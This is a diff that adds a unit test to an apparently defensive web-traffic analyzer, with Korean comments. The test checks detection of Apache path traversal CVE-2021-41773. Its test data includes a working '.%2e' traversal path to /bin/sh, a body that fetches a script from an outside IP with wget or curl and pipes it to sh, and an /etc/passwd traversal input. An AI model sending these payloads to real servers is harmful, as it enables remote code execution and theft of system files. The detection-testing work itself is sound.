@@ -437,6 +437,28 @@ def test_cve_identify_from_pasted_poc_and_modified_command(monkeypatch):
     assert A._cve_identify_from_request("http://t/api/users?id=1&cmd=foo", "u=admin", {}) == []
 
 
+def test_cve_identify_apache_traversal_raw_fragment():
+    """Apache CVE-2021-41773/42013: `.%2e` 인코딩이 식별 근거인데 URL 디코드하면
+    사라진다. RCE 변형(경로/명령이 달라도)이라도 raw fragment `/cgi-bin/.%2e/` 로
+    실제 뱅크의 CVE-2021-41773 을 식별하고, 정상/일반 traversal 은 오탐하지 않는다."""
+    from core import analyzer as A
+    A._CVE_ENTRIES = None
+    bank = [e.get("cve") for e in A._load_cve_entries()]
+    assert "CVE-2021-41773" in bank, "실제 뱅크에 CVE-2021-41773 이 있어야 함"
+    # PoC: /bin/sh RCE 변형 (뱅크는 /etc/passwd 변형) — 명령 본문까지 달라도 식별
+    rce = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+    body = "(wget -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh"
+    ident = A._cve_identify_from_request("http://t" + rce, body, {})
+    assert "CVE-2021-41773" in [s["cve"] for s in ident]
+    # 정상 요청·일반 traversal(../../etc/passwd)은 이 CVE 로 식별되면 안 됨
+    assert "CVE-2021-41773" not in [
+        s["cve"] for s in A._cve_identify_from_request("http://t/api/users?id=1", "u=admin", {})]
+    assert "CVE-2021-41773" not in [
+        s["cve"] for s in A._cve_identify_from_request(
+            "http://t/download?f=../../etc/passwd", "", {})]
+    A._CVE_ENTRIES = None
+
+
 def test_cve_pasted_packet_verified_by_identified_matcher(monkeypatch):
     """payload_id·category 없이 패킷만 복붙 → PoC 로 CVE 식별 → 그 CVE 매처가 응답에 맞으면 확증."""
     from core import analyzer as A
